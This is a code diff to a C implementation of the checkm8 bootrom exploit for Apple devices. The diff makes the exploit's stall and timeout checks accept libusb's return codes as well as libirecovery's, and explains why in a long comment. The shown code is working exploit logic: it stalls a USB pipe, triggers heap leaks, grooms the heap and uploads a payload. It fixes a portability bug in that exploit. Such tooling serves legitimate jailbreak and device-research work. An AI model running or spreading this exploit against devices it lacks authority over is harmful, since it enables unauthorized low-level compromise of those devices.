@@ -137,6 +137,43 @@ static int usb_req_no_leak(irecv_client_t client) {
     return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
 }
 
+// checkm8 deliberately induces a pipe stall as its first exploit step, and
+// relies on a transfer timeout for every heap leak after that -- these are
+// the sequence's success signals, not errors.
+//
+// irecv_usb_control_transfer() does not normalise its return value across
+// libirecovery's two backends. On IOKit it runs through
+// iokit_usb_control_transfer(), which translates IOKit status into
+// libirecovery's own enum (kIOUSBPipeStalled -> IRECV_E_PIPE == -10,
+// kIOReturnTimeout/kIOUSBTransactionTimeout -> IRECV_E_TIMEOUT == -11). On
+// libusb it is a bare pass-through returning libusb's raw codes from a
+// completely unrelated enum (LIBUSB_ERROR_PIPE == -9, LIBUSB_ERROR_TIMEOUT
+// == -7). Checking only the IRECV_E_* spelling makes a working exploit look
+// like an instant hard failure on Linux ("Failed to stall pipe -9.").
+//
+// docs/HISTORY.md records this exact gap being found and fixed once already,
+// in the DeviceManager.cpp checkm8() that predates this file. It came back
+// here because this file was recovered from the original Objective-C, which
+// only ever ran against IOKit.
+//
+// Accepting both spellings rather than selecting one per platform is safe,
+// not lazy: iokit_usb_control_transfer()'s translation table can only ever
+// return wLenDone, IRECV_E_PIPE, IRECV_E_TIMEOUT, IRECV_E_NO_DEVICE or
+// IRECV_E_UNKNOWN_ERROR, so -9 and -7 are values it cannot produce at all
+// and there is nothing for them to be confused with there. Spelled
+// numerically because <libusb.h> is not on this target's include path on
+// Apple, where it links no libusb at all.
+#define LIBUSB_RET_PIPE (-9)
+#define LIBUSB_RET_TIMEOUT (-7)
+
+static int isPipeStall(int ret) {
+    return ret == IRECV_E_PIPE || ret == LIBUSB_RET_PIPE;
+}
+
+static int isTransferTimeout(int ret) {
+    return ret == IRECV_E_TIMEOUT || ret == LIBUSB_RET_TIMEOUT;
+}
+
 static int get_payload_configuration(uint16_t cpid, const char* identifier, checkm8_config_t* config) {
     (void)identifier;
 
@@ -352,7 +389,7 @@ int runCheckm8(uint64_t ecid) {
     puts("Exploiting with checkm8");
 
     ret = usb_req_stall(client);
-    if (ret != IRECV_E_PIPE) {
+    if (!isPipeStall(ret)) {
         printf("Failed to stall pipe %i.\n", ret);
         free(config.payload);
         irecv_close(client);
@@ -363,7 +400,7 @@ int runCheckm8(uint64_t ecid) {
 
     for (int i = 0; i < config.large_leak; i++) {
         ret = usb_req_leak(client);
-        if (ret != IRECV_E_TIMEOUT) {
+        if (!isTransferTimeout(ret)) {
             printf("Failed to create heap hole.\n");
             free(config.payload);
             irecv_close(client);
@@ -372,7 +409,7 @@ int runCheckm8(uint64_t ecid) {
     }
 
     ret = usb_req_no_leak(client);
-    if (ret != IRECV_E_TIMEOUT) {
+    if (!isTransferTimeout(ret)) {
         printf("Failed to create heap hole.\n");
         free(config.payload);
         irecv_close(client);
@@ -429,7 +466,7 @@ int runCheckm8(uint64_t ecid) {
     puts("Grooming heap");
 
     ret = usb_req_stall(client);
-    if (ret != IRECV_E_PIPE) {
+    if (!isPipeStall(ret)) {
         printf("Failed to stall pipe.\n");
         free(config.payload);
         irecv_close(client);
@@ -439,7 +476,7 @@ int runCheckm8(uint64_t ecid) {
     usleep(100);
 
     ret = usb_req_leak(client);
-    if (ret != IRECV_E_TIMEOUT) {
+    if (!isTransferTimeout(ret)) {
         printf("Failed to create heap hole.\n");
         free(config.payload);
         irecv_close(client);
@@ -464,7 +501,7 @@ int runCheckm8(uint64_t ecid) {
     puts("Uploading payload");
 
     ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, config.payload, (uint16_t)config.payload_len, 100);
-    if (ret != IRECV_E_TIMEOUT) {
+    if (!isTransferTimeout(ret)) {
         printf("Failed to upload payload.\n");
         free(config.payload);
         irecv_close(client);
